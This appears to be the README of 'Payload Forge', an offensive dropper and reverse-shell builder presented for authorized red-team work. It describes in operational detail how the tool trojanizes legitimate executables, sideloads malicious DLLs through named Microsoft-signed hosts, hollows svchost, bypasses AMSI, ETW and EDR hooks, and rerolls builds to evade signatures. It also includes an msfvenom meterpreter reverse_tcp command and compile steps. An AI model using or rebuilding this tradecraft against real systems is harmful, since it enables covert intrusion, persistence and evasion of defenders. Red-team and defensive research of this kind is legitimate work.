# Payload Forge

A single-file, offline dropper & reverse-shell build system for **authorized penetration
testing, red-team engagements and adversary simulation only**.

Two front-ends:

- **`forge.py` — desktop GUI** (Tkinter, Python stdlib only). Pick a payload →
  LHOST/LPORT → injection / PE-injection / encryption / evasion → Generate.
  Wraps `msfvenom` for **Windows, Linux and macOS** payloads, or embeds a custom
  C2 implant file (Sliver / Havoc / Mythic / Mettle raw output).
- **`payload-forge.html` — browser studio** for the deep Windows tradecraft
  (C#/PowerShell, DLL sideloading, hollowing, sleep obfuscation). Still offline,
  still zero-dependency.

```
payload-forge/
├── forge.py              # desktop GUI app (pure stdlib)
├── payload-forge.html    # browser studio (single file, offline)
├── offsec-setup.sh       # one-shot offensive tooling installer (Arch/Kali)
├── tests/
│   ├── validate-builds.js  # full-matrix build validation harness
│   ├── poly-check.js       # polymorphism diff checker
│   └── vbs-parse.ps1       # helper used by the harness
├── requirements.txt      # explains the zero pip deps + system packages
├── LICENSE               # MIT + authorized-use-only notice
└── README.md
```

## forge.py — quick start

```bash
# Kali / Debian
sudo apt install python3-tk metasploit-framework gcc-mingw-w64 openssl
python3 forge.py            # GUI (authorization gate first)
python3 forge.py --selftest # 40-check offline validation, no msfvenom needed
```

**Payload Type** — `MSFvenom` (any payload in the list, Windows/Linux/macOS),
or `Custom (C2 implant)` pointing at a raw shellcode / `.so` / `.exe` file from
your C2 (Sliver, Havoc, Mythic Athena/Apollo, Mettle).

**Process Injection (T1055)** — CurrentThread · Remote Process ·
Process Hollowing (T1055.012) · APC Injection (T1055.004); on Linux the
injector route uses ptrace (T1055.008).

**PE Injection (T1055.002) — true file embedding** — tick the box and pick a
host executable (e.g. putty.exe): forge appends a `.pfsg` section to the host
PE containing the XOR-encrypted shellcode plus a 253-byte x64 entry stub, and
repoints the entry. The stub decrypts the stage in place, resolves
`CreateThread` via a PEB→Ldr→kernel32 export-table walk (ASLR-proof,
no relocations), fires the payload on a second thread, then jumps to the
original entry point. **The output IS the host program** — same name, icon,
version info — it opens and runs normally while the payload executes beside
it. One file in, one file out: deliver the patched executable, no separate
loader. x64 hosts only; PE embedding requires `pip install keystone-engine`.

**Encryption** — XOR Dynamic (rolling per-build key) · RC4 · AES-CTR (openssl,
Bcrypt/CryptoAPI in the loader). **Sandbox Evasion** — pre-exec sleep with ±35%
jitter (T1497.003). **x64** toggle picks the mingw cross-compiler arch.

Every build lands in `~/.payload-forge/builds/PF-XXXXXX-<target>/` with
`loader.c`, `build.sh`, `manifest.json` (keys, MITRE map, sizes) and, when a
cross-compiler is on PATH, the finished binary. Each build re-rolls its key and
identifiers — never ship the same file twice.

## What it does

Pick the evasion profile you want and get a **unique, ready-to-deploy payload** in
PowerShell or C#. The UI is a compact two-window desktop (740×530, transparent
window): a single top bar with the logo, title and legal tag, one horizontal
tab strip (**DELIVERY · STATIC · RUNTIME · EDR · DEPLOY**) instead of a sidebar
rail, plain child panels (no favorite stars, no sliders), and a **PAYLOAD
OUTPUT** window with presets, REROLL/COPY/SAVE, CODE/HOW/NOTES/RESEARCH tabs
and coverage meters.

| Group | Options |
| --- | --- |
| Delivery & network | **platform: WIN / MAC / ANDROID** · output: PowerShell / C# / **C DLL sideload (signed-host hijack, T1574.001)** / C (Mach-O loader) / Java (JNI loader) · staged (download cradle, PS only) or stageless · LHOST/LPORT · launcher: none / `-Enc` / VBS / HTA (WIN) · `.command` / `.app` (MAC) · `build.sh` APK assembler (ANDROID) · **import msfvenom shellcode** (payload.c / hex / raw .bin) → embedded, key-XOR-encrypted loader |
| Static-analysis evasion | XOR→Base64 in-memory encoding · identifier & comment randomization · junk/decoy code · payload chunking · **string encryption (XOR at rest)** · **assembly metadata spoofing** (C#) |
| Runtime / sandbox | anti-VM gate (CPU/RAM/uptime/manufacturer/hostname) · **adjustable pre-execution sleep (seconds + jitter %)** · **sleep obfuscation — Ekko-style memory flip (interval, jitter, XOR or RC4)** · **human-presence gate** (input + recent docs) · **network-reachability gate** (DNS) · **self-delete on exit** · hidden-window launcher · evasive reconnect loop |
| EDR bypass | AMSI bypass (byte-patch or reflection) · ETW patch · process injection (self-injection, **early-bird APC, process hollowing**) · ntdll unhooking · **indirect syscalls (Hell's Gate SSN re-resolution + disk-stub clones)** (C#) |
| Persistence | registry Run key · scheduled task · startup-folder shortcut (WIN) · LaunchAgent plist (MAC) · BOOT_COMPLETED receiver (ANDROID) |

Plus:

- **Session persistence** — the full state (format, launcher, stage, shellcode,
  every technique toggle, LHOST/LPORT, preset choices, active section/tab) is saved
  to `localStorage` on every change and restored on reload, so an interrupted
  session resumes exactly where it left off
- **Presets** — VANILLA / STATIC / SANDBOX / EDR / OPSEC
- **REROLL BUILD** — every build gets new identifiers, encryption keys, encoded string tables, metadata and junk code
  (polymorphism: never ship the same file twice)
- **Adjustable parameters** — per-build config sub-rows: pre-exec sleep duration + jitter %,
  sleep-obfuscation interval + jitter + cipher (XOR / RC4), and a 3rd injection method
  (process hollowing) — all persisted in the session
- **Coverage meters** — live static / runtime / EDR resistance scores
- **HOW / NOTES / RESEARCH tabs** — per-technique explanation, what defenders see,
  2024–2026 tradecraft summary and MITRE ATT&CK mapping
- **Signed-host DLL sideloading** — the **DLL⇢** output on WIN builds a malicious
  DLL in C (DllMain spawns the runner thread; API names XOR'd at rest, resolved via
  GetProcAddress) plus a `sideload.def` export table, a `build.cmd` (auto-detects
  MSVC / MinGW-w64) and a `deploy.ps1` that copies a **Microsoft-signed binary**
  next to the DLL and runs it — code executes inside a process whose signature is
  intact Microsoft. **16 hosts in the SIDELOAD TARGET list, 11 of them
  machine-verified on Win11 26200 (dumpbin static imports + real DLL export
  tables):** the `version.dll` family — certutil, whoami, msconfig, winsat,
  agentservice, sfc, cscript, wscript, **Sysinternals sigcheck64** (dropped beside
  deploy.ps1, signed by Microsoft) and **OneDrive.App.exe** (copied from
  %LOCALAPPDATA%) — plus magnify.exe → `magnification.dll`. version.dll is not a
  KnownDLL, so these fire at process start on any box where the host runs — no
  lazy perf-provider path. The RESEARCH tab carries the **VERIFIED BUILDS matrix**
  (per-host dumpbin verification + HijackLibs/research coverage, Win10 1709 →
  Win11) and every entry's SIDELOAD TARGET note shows its VERIFIED line; because
  builds change import tables, `verify-host.ps1` checks the exact target. Also included: SearchProtocolHost.exe → `msscntrs.dll`,
  hh.exe → `hhctrl.ocx`, Dism.exe → `DismCore.dll`, wmpshare.exe → `wmp.dll`, and
  a custom host. Trampoline exports forward to the real System32 DLL so the host
  keeps working; persistence option installs the signed host + DLL pair in the
  Startup folder
- **DLL⇢ + hollow combo** — the sideload's **EXECUTION** option can hand the
  shellcode to a **fresh signed svchost.exe**: spawn SUSPENDED (CreateProcessA),
  unmap the pristine image (`NtUnmapViewOfSection` from ntdll), allocate at the
  preferred image base, write the shellcode at the entry point, resume — the
  beacon runs as a second signed process (T1055.012). All hollow APIs are XOR'd at
  rest and resolved via GetProcAddress, same as the rest of the DLL

## Workflow

1. Open the file, accept the authorization gate.
2. Pick a preset or tick techniques manually.
3. **Import your msfvenom payload** — hit **IMPORT FILE** and pick a
   `payload.c` (`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=… LPORT=… -f c`),
   a `-f hex` string, `-f ps1`, or a raw `.bin`. The shellcode is parsed,
   XOR-encrypted with the build key, and embedded in the generated C# loader
   (or PowerShell runner). You can also paste the C array directly into the
   field.
4. Hit **DOWNLOAD** (or COPY), rename, test in your lab, then deploy.

## Validation

The PowerShell output was parse-validated against the real PowerShell language parser
across all technique combinations (vanilla → full evasion + persistence). The C# output
is a template you compile with `csc.exe /platform:x64 /optimize+ /out:client.exe Program.cs`.
The macOS loader is a C file you build with `clang -arch x86_64|arm64` (+ optional
`codesign`); the Android output is a Java/JNI project assembled by its `build.sh`
(SDK + NDK).

### Automated harness (`tests/validate-builds.js`)

`node tests/validate-builds.js` generates **every** output the app can emit — 5 presets
(VANILLA / STATIC / SANDBOX / EDR / OPSEC) × 8 format columns (C# / PS1 / `-ENC` /
VBS / HTA / **DLL** / C-MAC / JAVA) — headlessly (stubbed DOM, no browser), then validates each
with the **real toolchain**:

- **C#** → compiled with the .NET Framework `csc.exe` (x64, optimized)
- **PS1** → parsed with the real PowerShell language parser
- **`-ENC` / VBS / HTA** → the embedded `-Enc` blob is extracted, decoded
  (UTF-16LE), checked to byte-equal the wrapped body, and that decoded body is parsed
- **Wrapper layer (VBS / HTA)** → the launcher itself is compiled by the **real
  VBScript engine** (`cscript` on a sanitized copy — execution statements are
  neutralized and guarded, so the payload is never run), and the HTA must carry a
  structurally complete, properly closed document skeleton
- **C-MAC (Mach-O loader)** → structure check (main / mmap / PROT_EXEC) plus a
  **shellcode round-trip**: the embedded XOR blob is extracted, XOR-decoded with the
  emitted key, and must byte-match the source shellcode
- **JAVA (Android)** → structure check (Activity + JNI + manifest package) plus the
  same Base64/XOR round-trip; BootReceiver/manifest permission must match the
  persistence setting
- **DLL (sideload)** → the C source is compiled with the **real MSVC `cl.exe`**
  (via `vcvars64.bat`, `ws2_32.lib`), the compiled PE's export table is verified
  against `sideload.def` with `dumpbin` (all trampoline exports must be present),
  the embedded shellcode must XOR round-trip, `deploy.ps1` is parsed by the real
  PowerShell language parser and must carry the pre-flight **export probe** — it
  maps the DLL with `LoadLibraryEx(DONT_RESOLVE_DLL_REFERENCES)` so DllMain never
  runs, then `GetProcAddress`-checks every export the host needs (catches the
  RunDLL "missing entry" class on-target; `LOAD_LIBRARY_AS_IMAGE_RESOURCE` was
  rejected after measuring that it cannot resolve exports on Win11 26200) —
  `build.cmd` must reference its artifacts, and the empty-shell fallback must
  emit the winsock reverse shell. A **DLL HOST SWEEP**
  builds every one of the 11 verified SIDELOAD TARGET hosts (version.dll family +
  magnify) with real cl.exe and checks each export table lands in the PE. Every
  bundle now also ships **`verify-host.ps1`** — a pure-PowerShell PE import reader
  (no admin, no tools) that the operator runs on the *target* to confirm the
  signed host statically imports the squat DLL on that exact Windows build. The
  **DLL+H (hollow)
  column** runs the same MSVC compile + round-trip for the combo path and asserts
  each mode carries exactly its own machinery (self: no `NtUnmapViewOfSection` /
  `CREATE_SUSPENDED`; hollow: spawn-suspended → unmap → write-at-entry → resume
  present). A **DLL runtime firing check** then LoadLibrarys a freshly compiled
  fallback DLL in a real PowerShell process and requires the runner thread to
  deliver a loopback connect-back — this caught (and now prevents)
  compile-invisible bugs: user32 APIs resolved from kernel32 (RES() always
  failed → no DLL ever fired) and cmd.exe given non-pipe socket stdio (exits 1
  on modern Windows — now pipe-bridged). A **DLL DEPLOY LIVE-FIRE** check then
  runs the *real* `deploy.ps1` (copies System32 certutil, drops version.dll,
  launches the host) with a waiting loopback listener and requires the export
  probe to pass **and** the runner thread to complete a connect-back under the
  actual signed host — certutil lives ~39 ms here, so the completed TCP
  handshake is the proof (also documented on the RESEARCH tab: the
  pre-execution sleep must be off/low for fast-exiting hosts or the connect-back
  never fires; AB-tested on this box — sleep ON + certutil = no connect in 12 s,
  sleep OFF = fires in the host's life, and the same sleep-enabled DLL under a
  long-lived staged cscript host connected after ~28 s, inside the 22.5–37.5 s
  window; the real OneDrive client (Program Files) connected after ~23 s with
  the stage-dir version.dll in its module list, while the localappdata
  OneDrive.App.exe stub exits fast. Measured host caveats for Win11 26200:
  msconfig/magnify refuse non-System32 dirs (exit 3/1), winsat needs elevation,
  wmpshare is absent)
- **Native launchers** → all 15 mac `.sh`/`.app` + android `build.sh` variants are
  `bash -n` syntax-checked (with a broken-bash negative control) and must reference
  their build artifacts; the `build.sh` javac line includes `BootReceiver.java` only
  when Boot persistence is on
- **Empty-shell fallbacks** → no imported shellcode must yield the plain C reverse
  shell (socket/dup2/execl) / Java reverse shell (Socket + `/system/bin/sh`)
- **Persistence round-trip** → state is saved in one context, restored in a fresh
  one (simulated reload), and a corrupt blob must fall back to defaults

Prints a pass/fail matrix; exits non-zero on any failure (CI-friendly).
Artifacts are written under `tests/out/` (gitignored). Requires Node + Windows PowerShell
(`csc.exe` from the .NET Framework or on PATH; VBScript wrapper checks use
`cscript.exe`; launcher checks use Git Bash's `bash`).

### Polymorphism check (`tests/poly-check.js`)

`node tests/poly-check.js` generates 10 consecutive OPSEC C# rerolls and diffs each
consecutive pair with a **shift-immune content metric** (line-aligned, weighted by
the bytes of lines that actually differ — a positional byte diff would be inflated
by variable-length lines near the top shifting every later byte), quantifying what
REROLL actually randomizes: unique-build count, content-bytes/fraction changed per
reroll, the stable skeleton (identical prefix/suffix), and a line diff showing
exactly which regions vary (identifiers, XOR key, encoded blob, string-encryption
tables, metadata, sleep literals, junk). Baseline with the full enterprise stack:
**~7.6% of content changes per reroll (~1,045 of ~13.7 KB)**, 10/10 unique files,
34% of lines re-randomized — enough to defeat exact-string signatures, but the
~92% stable skeleton remains vulnerable to fuzzy/similarity hashing (ssdeep/TLSH).

## Rules of engagement

- **Authorized targets only.** Written authorization is a prerequisite, not a suggestion.
- Generate a **unique build per deployment** — never reuse payload files.
- Test every build in your own lab first; each AV/EDR behaves differently.
- **Remove persistence and clean up** at the end of the engagement. Leftover scheduled
  tasks / Run keys are findings in your own report.
- These techniques are all publicly documented tradecraft (MITRE ATT&CK). They are
  **detectable** — evasion is a race, not a win condition.

## Disclaimer

For educational and defensive-research purposes. Deploying payloads without authorization
is illegal in most jurisdictions. The author accepts no liability for misuse.
